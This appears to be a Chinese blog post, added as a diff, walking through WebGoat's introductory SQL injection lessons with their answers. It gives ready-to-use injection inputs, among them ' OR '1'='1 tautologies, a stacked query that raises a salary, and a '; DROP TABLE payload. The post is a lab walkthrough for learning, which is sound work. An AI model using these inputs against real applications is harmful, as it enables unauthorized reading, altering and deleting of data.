@@ -1,0 +1,310 @@
+<!DOCTYPE html>
+<html lang="zh">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>
+      
+    从 0 开始的 WebGoat 学习 (1) - Injection(intro) - chan9t1an 的安全学习
+    
+    </title>
+    
+
+    
+    
+    <link href="atom.xml" rel="alternate" title="chan9t1an 的安全学习" type="application/atom+xml">
+    <link rel="stylesheet" href="asset/css/style.min.css">
+    <link rel="stylesheet" href="asset/css/doc.css">
+    <script src="asset/app.js"></script>
+</head>
+  <body>
+    <section class="hero">
+      <div class="hero-head">
+          <nav class="navbar" role="navigation" aria-label="main navigation">
+              <div class="container">
+              <div class="navbar-brand">
+                
+                <a target="self" class="navbar-item " href="index.html">Home</a>
+                
+                <a target="_self" class="navbar-item " href="archives.html">Archives</a>
+                
+
+                <a role="button" id="navbarSNSRssSwitchBtn" class="navbar-burger burger" aria-label="menu" aria-expanded="false" data-target="navbarSNSRssButtons">
+                  <span aria-hidden="true"></span>
+                  <span aria-hidden="true"></span>
+                  <span aria-hidden="true"></span>
+                </a>
+              </div>
+            
+              <div id="navbarSNSRssButtons" class="navbar-menu">
+                <div class="navbar-start">
+                  
+                </div>
+            
+                <div class="navbar-end">
+                  <div class="navbar-item">
+                    <!--buttons start-->
+                    <div class="buttons">
+                      
+                        
+                        
+                        
+                        
+                      
+                      <a href="atom.xml" target="_blank" title="RSS">
+                          <span class="icon is-large has-text-black-bis">
+                              <svg class="svg-inline--fa fa-rss fa-w-14 fa-lg" aria-hidden="true" focusable="false" data-prefix="fas" data-icon="rss" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" data-fa-i2svg=""><path fill="currentColor" d="M128.081 415.959c0 35.369-28.672 64.041-64.041 64.041S0 451.328 0 415.959s28.672-64.041 64.041-64.041 64.04 28.673 64.04 64.041zm175.66 47.25c-8.354-154.6-132.185-278.587-286.95-286.95C7.656 175.765 0 183.105 0 192.253v48.069c0 8.415 6.49 15.472 14.887 16.018 111.832 7.284 201.473 96.702 208.772 208.772.547 8.397 7.604 14.887 16.018 14.887h48.069c9.149.001 16.489-7.655 15.995-16.79zm144.249.288C439.596 229.677 251.465 40.445 16.503 32.01 7.473 31.686 0 38.981 0 48.016v48.068c0 8.625 6.835 15.645 15.453 15.999 191.179 7.839 344.627 161.316 352.465 352.465.353 8.618 7.373 15.453 15.999 15.453h48.068c9.034-.001 16.329-7.474 16.005-16.504z"></path></svg><!-- <i class="fas fa-rss fa-lg"></i> -->
+                          </span>
+                      </a>
+                    </div>
+                    <!--buttons end-->
+
+                  </div>
+                </div>
+                </div>
+              </div>
+            </nav>
+      </div>
+
+ <div class="hero-body ct-body"></div>
+      
+    </section>
+    <section class="ct-body">
+      <div class="container">
+          <div class="columns is-variable bd-klmn-columns is-4 is-centered">
+              <div class="column is-four-fifths">
+                  <div class="post-body single-content">
+                    
+                    <h1 class="title">
+                            从 0 开始的 WebGoat 学习 (1) - Injection(intro)   
+                      </h1>
+                     
+                    
+                      <div class="media">
+                            
+                            <div class="media-content">
+                              <div class="content">
+                                <p>
+                                 <span class="date">2021/12/20 16:47 下午</span>
+                                  <span class="tran-posted-in">posted in</span>&nbsp; 
+                                  
+                                      <span class="posted-in"><a href='WebGoat.html'>WebGoat</a></span>
+                                         
+                                  
+
+                                   
+                                      
+                                  <br />
+                                  <span class="tran-tags">Tags:</span>&nbsp;
+                                  
+                                    <a class="tag is-link is-light" href='tag_security.html'>#security</a>
+                                  
+                                    <a class="tag is-link is-light" href='tag_sql.html'>#sql</a>
+                                  
+                                    <a class="tag is-link is-light" href='tag_injection.html'>#injection</a>
+                                     
+
+                                </p>
+                              </div>
+                            </div>
+                         
+                    </div>
+                </div>
+                  <article class="markdown-body single-content">
+                    <ul>
+<li><a href="#%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%9A%84-webgoat%E5%AD%A6%E4%B9%A0-1-injection-intro">从 0 开始的 WebGoat 学习 (1) - Injection(intro)</a></li>
+<li><a href="#0x00%E5%AD%A6%E4%B9%A0%E7%9B%AE%E6%A0%87">0x00 学习目标</a>
+<ul>
+<li><a href="#0x01-sql%E5%9F%BA%E7%A1%80">0x01 SQL 基础</a>
+<ul>
+<li><a href="#lesson-1%E9%A2%98%E7%9B%AE">Lesson 1 题目</a></li>
+<li><a href="#lesson-2%E9%A2%98%E7%9B%AE">Lesson 2 题目</a></li>
+<li><a href="#lesson-3%E9%A2%98%E7%9B%AE">Lesson 3 题目</a></li>
+<li><a href="#lesson-4%E9%A2%98%E7%9B%AE">Lesson 4 题目</a></li>
+</ul>
+</li>
+<li><a href="#0x02-sql%E6%B3%A8%E5%85%A5">0x02 SQL 注入</a></li>
+<li><a href="#0x03-sql%E6%B3%A8%E5%85%A5%E7%9A%84%E7%BB%93%E6%9E%9C%E5%92%8C%E4%B8%A5%E9%87%8D%E6%80%A7">0x03 SQL 注入的结果和严重性</a></li>
+<li><a href="#0x04%E4%B8%80%E4%BA%9B%E7%AE%80%E5%8D%95%E7%BB%83%E4%B9%A0">0x04 一些简单练习</a>
+<ul>
+<li><a href="#lesson-9%E9%A2%98%E7%9B%AE">Lesson 9 题目</a></li>
+<li><a href="#lesson-10%E9%A2%98%E7%9B%AE">Lesson 10 题目</a></li>
+<li><a href="#lesson-11%E9%A2%98%E7%9B%AE">Lesson 11 题目</a></li>
+<li><a href="#lesson-12%E9%A2%98%E7%9B%AE">Lesson 12 题目</a></li>
+<li><a href="#lesson-13%E9%A2%98%E7%9B%AE">Lesson 13 题目</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h1><a id="0x00%E5%AD%A6%E4%B9%A0%E7%9B%AE%E6%A0%87" class="anchor" aria-hidden="true"><span class="octicon octicon-link"></span></a>0x00 学习目标</h1>
+<ul>
+<li>DML, DLL 和 DCL</li>
+<li>字符型 SQL 注入</li>
+<li>数字型 SQL 注入</li>
+<li>SQL 注入如何违反 CIA 原则</li>
+</ul>
+<h2><a id="0x01-sql%E5%9F%BA%E7%A1%80" class="anchor" aria-hidden="true"><span class="octicon octicon-link"></span></a>0x01 SQL 基础</h2>
+<p>不多复述了</p>
+<p>多了解一先名词解释的话:</p>
+<ul>
+<li>Data Manipulation Language (DML)
+<ul>
+<li>就是 CRUD</li>
+</ul>
+</li>
+<li>Data Definition Language (DDL)
+<ul>
+<li>就是表结构的定义和对表的操作</li>
+<li>create, alter, drop</li>
+</ul>
+</li>
+<li>Data Control Language (DCL)
+<ul>
+<li>权限操作</li>
+<li>grant, revoke</li>
+</ul>
+</li>
+</ul>
+<h3><a id="lesson-1%E9%A2%98%E7%9B%AE" class="anchor" aria-hidden="true"><span class="octicon octicon-link"></span></a>Lesson 1 题目</h3>
+<p>最基本的 select, 不多说了</p>
+<pre><code class="language-sql">select department from employees 
+    where first_name = 'Bob' and last_name = 'Franco';
+</code></pre>
+<h3><a id="lesson-2%E9%A2%98%E7%9B%AE" class="anchor" aria-hidden="true"><span class="octicon octicon-link"></span></a>Lesson 2 题目</h3>
+<p>最基本的 update, 不多说了</p>
+<pre><code class="language-sql">update employees
+    set department = 'Sales' 
+    where first_name = 'Tobi' and last_name = 'Barnett';
+</code></pre>
+<h3><a id="lesson-3%E9%A2%98%E7%9B%AE" class="anchor" aria-hidden="true"><span class="octicon octicon-link"></span></a>Lesson 3 题目</h3>
+<pre><code class="language-sql">alter table employees 
+    add column
+    phone varchar(20);
+</code></pre>
+<h3><a id="lesson-4%E9%A2%98%E7%9B%AE" class="anchor" aria-hidden="true"><span class="octicon octicon-link"></span></a>Lesson 4 题目</h3>
+<pre><code class="language-sql">grant ALL
+    ON grant_rights
+    TO unauthorized_user;
+</code></pre>
+<h2><a id="0x02-sql%E6%B3%A8%E5%85%A5" class="anchor" aria-hidden="true"><span class="octicon octicon-link"></span></a>0x02 SQL 注入</h2>
+<pre><code class="language-sql">&quot;SELECT * FROM users WHERE name = '&quot; + userName + &quot;'&quot;;
+
+-- userName: hello' OR '1' = '1
+SELECT * FROM users WHERE name = 'hello' OR '1' = '1';
+
+-- userName: Smith' OR 1 = 1; --
+SELECT * FROM users WHERE name = 'Smith' OR 1 = 1; --
+</code></pre>
+<blockquote>
+<p>本质上来说, SQL 注入是一种 <strong>&quot;注入&quot;</strong> 攻击<br />
+也就是说, 程序运行了将来自外界的不安全输入放到了自己的环境中去运行<br />
+&quot;永远不要相信用户的输入&quot;</p>
+</blockquote>
+<h2><a id="0x03-sql%E6%B3%A8%E5%85%A5%E7%9A%84%E7%BB%93%E6%9E%9C%E5%92%8C%E4%B8%A5%E9%87%8D%E6%80%A7" class="anchor" aria-hidden="true"><span class="octicon octicon-link"></span></a>0x03 SQL 注入的结果和严重性</h2>
+<p>不复述了, 危害极大</p>
+<blockquote>
+<p>但话说回来, SQL 注入的防御其实也是很容易的<br />
+按我的理解, SQL 注入更多是因为很多语言早期所使用的流行的库/开发模式完全没考虑这一点, 现代一些的库/框架都会对 SQL 注入有个最基本的防范<br />
+也许还有其他可以利用的方式, 但至少不会被这么傻直接注入进去</p>
+</blockquote>
+<h2><a id="0x04%E4%B8%80%E4%BA%9B%E7%AE%80%E5%8D%95%E7%BB%83%E4%B9%A0" class="anchor" aria-hidden="true"><span class="octicon octicon-link"></span></a>0x04 一些简单练习</h2>
+<h3><a id="lesson-9%E9%A2%98%E7%9B%AE" class="anchor" aria-hidden="true"><span class="octicon octicon-link"></span></a>Lesson 9 题目</h3>
+<p>其实就是要把 SQL 语句给 <strong>&quot;凑&quot;</strong> 出来</p>
+<p>&quot;凑&quot; 之前还是要去猜测原本程序逻辑中 SQL 是如何拼接的 (不过这里题目都是直接给出来了), 然后按照它的拼接方式, 把括号/引号等符号闭合, 再加上我们想要的内容</p>
+<h3><a id="lesson-10%E9%A2%98%E7%9B%AE" class="anchor" aria-hidden="true"><span class="octicon octicon-link"></span></a>Lesson 10 题目</h3>
+<pre><code class="language-sql">-- 观察题目, userid 和 Login_Count 应该都是个数字
+SELECT * From user_data WHERE Login_Count = 0 and userid= 1 or TRUE
+</code></pre>
+<h3><a id="lesson-11%E9%A2%98%E7%9B%AE" class="anchor" aria-hidden="true"><span class="octicon octicon-link"></span></a>Lesson 11 题目</h3>
+<pre><code class="language-sql">-- 目标: 查询所有数据
+
+-- SQL 拼接逻辑
+-- &quot;SELECT * FROM employees WHERE last_name = '&quot; + name + &quot;' AND auth_tan = '&quot; + auth_tan + &quot;'&quot;;
+
+-- 预期的 SQL
+SELECT * FROM employees WHERE last_name = '' AND auth_tan = '' OR '1'='1';
+
+-- 需要填写的内容
+-- ' OR '1'='1
+</code></pre>
+<h3><a id="lesson-12%E9%A2%98%E7%9B%AE" class="anchor" aria-hidden="true"><span class="octicon octicon-link"></span></a>Lesson 12 题目</h3>
+<pre><code class="language-sql">-- 目标: 把自己的薪水设置为最高
+
+-- SQL 拼接逻辑
+-- &quot;SELECT * FROM employees WHERE last_name = '&quot; + name + &quot;' AND auth_tan = '&quot; + auth_tan + &quot;'&quot;;
+
+-- 预期的 SQL
+SELECT * FROM employees WHERE last_name = '' AND auth_tan = ''; update employees set salary=100000 where last_name='Smith'
+
+-- 需要填写的内容
+-- '; update employees set salary=100000 where last_name='Smith
+</code></pre>
+<h3><a id="lesson-13%E9%A2%98%E7%9B%AE" class="anchor" aria-hidden="true"><span class="octicon octicon-link"></span></a>Lesson 13 题目</h3>
+<p>这题目有点离谱, 居然提示让删掉整表..</p>
+<pre><code class="language-sql">-- 猜测 SQL 拼接逻辑
+--&quot;select * from audit_log where action like '%&quot; + action + &quot;%'&quot;
+
+-- 预期的 SQL
+select * from audit_log where action like '%';DROP TABLE access_log;--%'
+
+-- 需要注入的输入
+-- ';DROP TABLE access_log;--
+</code></pre>
+
+                  </article>
+                  <div class="comments-wrap">
+                    <div class="share-comments">
+                      
+
+                      
+
+                      
+                    </div>
+                  </div><!-- end comments wrap -->
+              </div>
+            </div><!-- end columns -->
+      </div><!-- end container -->
+    </section>
+
+
+
+    <footer class="footer">
+        <div class="content has-text-centered">
+          <p>
+              Copyright &copy; 2019
+              Powered by <a target="_blank" href="http://www.mweb.im">MWeb</a>,&nbsp; 
+              Theme used <a target="_blank" href="https://bulma.io/">Bulma CSS</a>.
+          </p>
+        </div>
+      </footer>
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script src="asset/prism.js"></script>
+
+
+
+  
+    
+
+
+
+
+  </body>
+</html>
